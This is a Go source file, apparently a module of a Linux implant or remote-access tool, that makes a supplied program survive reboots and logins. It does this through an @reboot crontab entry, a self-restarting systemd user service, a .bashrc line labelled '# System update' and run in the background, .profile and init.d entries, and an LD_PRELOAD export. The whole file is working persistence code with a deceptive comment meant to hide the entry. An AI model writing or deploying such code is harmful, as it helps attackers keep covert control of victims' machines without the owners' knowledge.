// +build linux

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// PersistenceLinux provides persistence mechanisms for Linux
type PersistenceLinux struct{}

func NewPersistence() *PersistenceLinux {
	return &PersistenceLinux{}
}

// CronJob adds a cron job for persistence
func (p *PersistenceLinux) CronJob(command string) error {
	cronEntry := fmt.Sprintf("@reboot %s\n", command)

	// Get current crontab
	currentCrontab, _ := exec.Command("crontab", "-l").Output()

	// Add new entry
	newCrontab := string(currentCrontab) + cronEntry

	// Install new crontab
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	return cmd.Run()
}

// RemoveCronJob removes a cron job
func (p *PersistenceLinux) RemoveCronJob(command string) error {
	currentCrontab, _ := exec.Command("crontab", "-l").Output()

	lines := strings.Split(string(currentCrontab), "\n")
	var newLines []string

	for _, line := range lines {
		if !strings.Contains(line, command) {
			newLines = append(newLines, line)
		}
	}

	newCrontab := strings.Join(newLines, "\n")
	cmd := exec.Command("crontab", "-")
	cmd.Stdin = strings.NewReader(newCrontab)
	return cmd.Run()
}

// SystemdService creates a systemd user service for persistence
func (p *PersistenceLinux) SystemdService(name, exePath string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
`, name, exePath)

	// Create systemd user directory
	systemdDir := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
	os.MkdirAll(systemdDir, 0755)

	// Write service file
	servicePath := filepath.Join(systemdDir, name+".service")
	err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
	if err != nil {
		return err
	}

	// Enable the service
	exec.Command("systemctl", "--user", "enable", name+".service").Run()
	exec.Command("systemctl", "--user", "start", name+".service").Run()

	return nil
}

// RemoveSystemdService removes a systemd user service
func (p *PersistenceLinux) RemoveSystemdService(name string) error {
	exec.Command("systemctl", "--user", "stop", name+".service").Run()
	exec.Command("systemctl", "--user", "disable", name+".service").Run()

	systemdDir := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
	servicePath := filepath.Join(systemdDir, name+".service")

	return os.Remove(servicePath)
}

// Bashrc adds a command to .bashrc for persistence
func (p *PersistenceLinux) Bashrc(command string) error {
	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")

	// Check if already exists
	content, _ := os.ReadFile(bashrcPath)
	if strings.Contains(string(content), command) {
		return nil
	}

	// Append command
	f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString("\n# System update\n" + command + " &\n")
	return err
}

// RemoveBashrc removes a command from .bashrc
func (p *PersistenceLinux) RemoveBashrc(command string) error {
	bashrcPath := filepath.Join(os.Getenv("HOME"), ".bashrc")

	content, err := os.ReadFile(bashrcPath)
	if err != nil {
		return err
	}

	lines := strings.Split(string(content), "\n")
	var newLines []string
	skipNext := false

	for _, line := range lines {
		if skipNext {
			skipNext = false
			continue
		}
		if strings.Contains(line, "# System update") {
			skipNext = true
			continue
		}
		if !strings.Contains(line, command) {
			newLines = append(newLines, line)
		}
	}

	return os.WriteFile(bashrcPath, []byte(strings.Join(newLines, "\n")), 0644)
}

// Profile adds a command to .profile for persistence
func (p *PersistenceLinux) Profile(command string) error {
	profilePath := filepath.Join(os.Getenv("HOME"), ".profile")

	content, _ := os.ReadFile(profilePath)
	if strings.Contains(string(content), command) {
		return nil
	}

	f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString("\n" + command + "\n")
	return err
}

// InitScript creates an init script (requires root)
func (p *PersistenceLinux) InitScript(name, exePath string) error {
	initContent := fmt.Sprintf(`#!/bin/sh
### BEGIN INIT INFO
# Provides:          %s
# Required-Start:    $network
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: %s
### END INIT INFO

case "$1" in
  start)
    %s &
    ;;
  stop)
    killall %s
    ;;
  restart)
    $0 stop
    $0 start
    ;;
esac
`, name, name, exePath, filepath.Base(exePath))

	initPath := "/etc/init.d/" + name
	err := os.WriteFile(initPath, []byte(initContent), 0755)
	if err != nil {
		return err
	}

	// Enable the service
	exec.Command("update-rc.d", name, "defaults").Run()
	exec.Command("update-rc.d", name, "enable").Run()

	return nil
}

// RemoveInitScript removes an init script
func (p *PersistenceLinux) RemoveInitScript(name string) error {
	exec.Command("update-rc.d", name, "disable").Run()
	exec.Command("update-rc.d", name, "remove").Run()
	return os.Remove("/etc/init.d/" + name)
}

// LDPreload adds LD_PRELOAD persistence
func (p *PersistenceLinux) LDPreload(soPath string) error {
	profilePath := filepath.Join(os.Getenv("HOME"), ".profile")

	content, _ := os.ReadFile(profilePath)
	preloadLine := fmt.Sprintf("export LD_PRELOAD=%s", soPath)

	if strings.Contains(string(content), preloadLine) {
		return nil
	}

	f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString("\n" + preloadLine + "\n")
	return err
}
